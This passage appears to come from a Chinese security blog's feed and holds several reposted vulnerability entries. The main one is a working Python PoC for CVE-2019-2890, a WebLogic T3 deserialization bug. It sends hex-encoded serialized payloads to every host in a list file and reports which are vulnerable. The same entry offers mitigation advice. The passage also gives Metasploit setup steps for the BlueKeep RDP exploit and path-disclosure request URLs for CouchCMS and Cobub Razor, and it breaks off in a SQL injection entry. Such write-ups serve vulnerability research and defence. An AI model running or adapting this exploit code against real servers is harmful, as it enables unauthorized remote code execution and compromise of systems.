架构的中间件，用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用。</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。本漏洞绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击。</p><p>由于T3协议在Weblogic控制台开启的情况下默认开启，而Weblogic默认安装会自动开启控制台，所以攻击者可通过此漏洞造成远程代码执行，以控制Weblogic服务器。</p><p>漏洞PoC如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 2019-10-17 8:45</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">timeout = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">VUL=[<span class="string">&#x27;CVE-2019-2890&#x27;</span>]</span><br><span class="line">PAYLOAD=[<span class="string">&#x27;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#x27;</span>]</span><br><span class="line">VER_SIG=[<span class="string">&#x27;\\$Proxy[0-9]+&#x27;</span>]</span><br><span class="line">vul_no = []</span><br><span class="line">vul_yes = []</span><br><span class="line">vul_more_test = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t3handshake</span>(<span class="params">sock,server_addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;正在连接服务器...&#x27;</span></span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildT3RequestObject</span>(<span class="params">sock,port,server_addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;%s:%d连接成功，正在发送请求...&#x27;</span> %(server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>])</span><br><span class="line">    data1 = <span class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport))</span><br><span class="line">    data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">    data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    lendate = <span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;发送有效载荷请求成功,接收长度:%d&#x27;</span>%(lendate)</span><br><span class="line">    <span class="keyword">return</span> lendate</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span>(<span class="params">sock,data,lendate</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;正在执行载荷，请稍等...&#x27;</span></span><br><span class="line">    payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            end =time.time()</span><br><span class="line">            timeend = end-start</span><br><span class="line">            <span class="keyword">if</span> lendate == <span class="number">0</span> <span class="keyword">and</span> timeend &gt; timeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVul</span>(<span class="params">res,server_addr,index</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;执行结果：&#x27;</span></span><br><span class="line">    p=re.findall(VER_SIG[index], res, re.S)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s:%d 存在 %s 漏洞。&#x27;</span>%(server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>],VUL[index])</span><br><span class="line">        vul_yes.append(server_addr)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s:%d 不存在 %s 漏洞。&#x27;</span> % (server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>],VUL[index])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] You look like Cai Xukun when you play basketball&#x27;</span></span><br><span class="line">        vul_no.append(server_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> lists:</span><br><span class="line">        <span class="keyword">for</span> server_addr <span class="keyword">in</span> lists:</span><br><span class="line">            server_addr=server_addr.strip(<span class="string">&#x27;\n\r&#x27;</span>)</span><br><span class="line">            dip=server_addr.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">global</span> dport</span><br><span class="line">            dport=<span class="built_in">int</span>(server_addr.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            sock.settimeout(<span class="number">15</span>)</span><br><span class="line">            server_addr = (dip, dport)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                t3handshake(sock,server_addr)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;%s:%d连接失败，请检查IP是否存活...&#x27;</span> %(server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    lendate = buildT3RequestObject(sock,dport,server_addr)</span><br><span class="line">                    rs=sendEvilObjData(sock,PAYLOAD[index],lendate)</span><br><span class="line">                    <span class="comment"># print &#x27;rs&#x27;,rs</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;%s:%d请求频繁，请稍后自行单独测试...&#x27;</span> %(server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>])</span><br><span class="line">                    vul_more_test.append(server_addr)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    checkVul(rs,server_addr,index)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;=&#x27;</span>*<span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;检测完成！&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;以下IP存在CVE-2019-2890漏洞：&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> yes <span class="keyword">in</span> vul_yes:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s:%s&#x27;</span> % (yes[<span class="number">0</span>],yes[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;=&#x27;</span>*<span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;以下IP不存在漏洞：&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> vul_no:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s:%s&#x27;</span> % (no[<span class="number">0</span>],no[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;=&#x27;</span>*<span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;以下IP请求频繁，需单独自行测试：&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> more <span class="keyword">in</span> vul_more_test:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s:%s&#x27;</span> % (more[<span class="number">0</span>],more[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;=&#x27;</span>*<span class="number">50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p><strong>严重</strong></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>WebLogic Server 10.3.6.0</p><p>WebLogic Server 12.1.3.0</p><p>WebLogic Server 12.2.1.3</p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><p>一、禁用 T3 协议  </p><p>如果您不依赖 T3 协议进行 JVM 通信，可通过暂时阻断 T3 协议缓解此漏洞带来的影响。  </p><ol><li><p>进入 Weblogic 控制台，在 base_domain 配置页面中，进入“安全”选项卡页面，点击“筛选器”，配置筛选器。  </p></li><li><p>在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001 deny t3 t3s。  </p></li><li><p>保存生效（无需重启）。  </p></li></ol><p>二、排查弱口令  </p><p>排查 Weblogic 管理后台是否存在弱口令，增强密码强度。  </p><p>三、升级补丁  </p><p>相关链接  </p><p><a href="https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html">https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> CVE-2019-2890-Oracle WebLogic </tag>
            
            <tag> 反序列化严重漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708-msf快速搭建</title>
      <link href="2021/01/17/CVE-2019-0708-msf%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA/"/>
      <url>2021/01/17/CVE-2019-0708-msf%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#67;&#97;&#116;&#87;&#70;&#89;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#x4a;&#x6f;&#67;&#97;&#116;&#87;&#70;&#89;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libsqlite3-dev libpq-dev libpcap-dev -y</span><br><span class="line">git clone https://github.com/rapid7/metasploit-framework.git</span><br><span class="line">cd metasploit-framework</span><br><span class="line">git fetch origin pull/12283/head:bluekeep</span><br><span class="line">git checkout bluekeep</span><br><span class="line">gem install bundler &amp;&amp; bundle</span><br><span class="line">./msfconsole</span><br><span class="line">msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br></pre></td></tr></table></figure><blockquote><p>如果出现如下错误:</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/bundle/bin/bundle:104:in `load&#x27;: cannot load such file -- /usr/local/lib/ruby/gems/2.4.0/gems/bundler-1.16.1/exe/bundle (LoadError)</span><br><span class="line"></span><br><span class="line">from /usr/local/bundle/bin/bundle:104:in `&lt;main&gt;&#x27;</span><br></pre></td></tr></table></figure><p>可以尝试使用如下命令修复:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gem update --system</span><br><span class="line">gem pristine bundler</span><br></pre></td></tr></table></figure><blockquote><p>仅在Debian测试过</p></blockquote><blockquote><p>参考: <a href="https://pentest-tools.com/blog/bluekeep-exploit-metasploit/">https://pentest-tools.com/blog/bluekeep-exploit-metasploit/</a> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2019-0708 </tag>
            
            <tag> msf </tag>
            
            <tag> POC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Couch through 2.0存在路径泄露漏洞</title>
      <link href="2021/01/17/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#111;&#67;&#x61;&#x74;&#87;&#70;&#89;&#64;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#109;">&#x4a;&#111;&#67;&#x61;&#x74;&#87;&#70;&#89;&#64;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#109;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Couch through 2.0存在路径泄露漏洞</td><td>2018-03-04</td><td>zzw (<a href="mailto:&#x7a;&#x7a;&#x77;&#64;&#x35;&#x65;&#x63;&#117;&#114;&#105;&#x74;&#x79;&#46;&#99;&#x6e;">&#x7a;&#x7a;&#x77;&#64;&#x35;&#x65;&#x63;&#117;&#114;&#105;&#x74;&#x79;&#46;&#99;&#x6e;</a>)</td><td><a href="https://github.com/CouchCMS/CouchCMS/">https://github.com/CouchCMS/CouchCMS/</a></td><td><a href="https://github.com/CouchCMS/CouchCMS/">https://github.com/CouchCMS/CouchCMS/</a></td><td>2.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7662">CVE-2018-7662</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Couch through 2.0存在路径泄露漏洞，当访问特定url时系统返回的报错信息中暴露物理路径信息。Couch through是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/CouchCMS/CouchCMS/issues/46">issues</a>告知作者。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><hr><p>访问如下页面，报错信息中显示完整物理路径信息。</p><pre><code>Location:includes/mysql2i/mysql2i.func.phpaddons/phpmailer/phpmailer.php</code></pre>]]></content>
      
      
      <categories>
          
          <category> 转载文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Couch through 2.0 </tag>
            
            <tag> 路径泄露漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobub Razor 0.8.0存在物理路径泄露漏洞</title>
      <link href="2021/01/17/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#97;&#116;&#x57;&#x46;&#x59;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#x6d;">&#74;&#111;&#67;&#97;&#116;&#x57;&#x46;&#x59;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#x6d;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Cobub Razor 0.8.0存在物理路径泄露漏洞</td><td>2018-04-20</td><td>Kyhvedn（<a href="mailto:&#x79;&#x69;&#110;&#102;&#x65;&#110;&#103;&#119;&#117;&#121;&#117;&#101;&#x79;&#105;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#111;&#x6d;">&#x79;&#x69;&#110;&#102;&#x65;&#110;&#103;&#119;&#117;&#121;&#117;&#101;&#x79;&#105;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#111;&#x6d;</a>、kyhvedn@5ecurity.cn）</td><td><a href="http://www.cobub.com/">http://www.cobub.com/</a></td><td><a href="https://github.com/cobub/razor/">https://github.com/cobub/razor/</a></td><td>0.8.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8056">CVE-2018-8056</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8770">CVE-2018-8770</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/cobub/razor/issues/162">issues</a>告知作者。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>方法一：  </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL: http:&#x2F;&#x2F;localhost&#x2F;export.php</span><br><span class="line">HTTP Method: GET</span><br><span class="line">URL: http:&#x2F;&#x2F;localhost&#x2F;index.php?&#x2F;manage&#x2F;channel&#x2F;addchannel</span><br><span class="line">HTTP Method: POST</span><br><span class="line">Data: channel_name&#x3D;test&quot;&amp;platform&#x3D;1</span><br></pre></td></tr></table></figure><blockquote><p>方法二：<br>Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Method: GET</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;generate.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;getConfigTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;getUpdateTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;postclientdataTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;posterrorTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;posteventTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;posttagTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;controllers&#x2F;postusinglogTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;fixtures&#x2F;Controller_fixt.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;fixtures&#x2F;Controller_fixt2.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;fixtures&#x2F;view_fixt2.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;libs&#x2F;ipTest.php</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tests&#x2F;models&#x2F;commonDbfix.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 转载文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobub Razor 0.8.0 </tag>
            
            <tag> 物理路径泄露漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobub Razor 0.8.0存在SQL注入漏洞</title>
      <link href="2021/01/17/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#111;&#x43;&#x61;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#x36;&#51;&#46;&#x63;&#x6f;&#x6d;">&#x4a;&#111;&#x43;&#x61;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#x36;&#51;&#46;&#x63;&#x6f;&#x6d;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Cobub Razor 0.8.0存在SQL注入漏洞</td><td>2018-04-16</td><td>Kyhvedn（<a href="mailto:&#x79;&#x69;&#x6e;&#102;&#x65;&#110;&#x67;&#x77;&#x75;&#121;&#x75;&#x65;&#121;&#105;&#x40;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#x6d;">&#x79;&#x69;&#x6e;&#102;&#x65;&#110;&#x67;&#x77;&#x75;&#121;&#x75;&#x65;&#121;&#105;&#x40;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#x6d;</a>、kyhvedn@5ecurity.cn）</td><td><a href="http://www.cobub.com/">http://www.cobub.com/</a></td><td><a href="https://github.com/cobub/razor/">https://github.com/cobub/razor/</a></td><td>0.8.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8057">CVE-2018-8057</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Cobub Razor 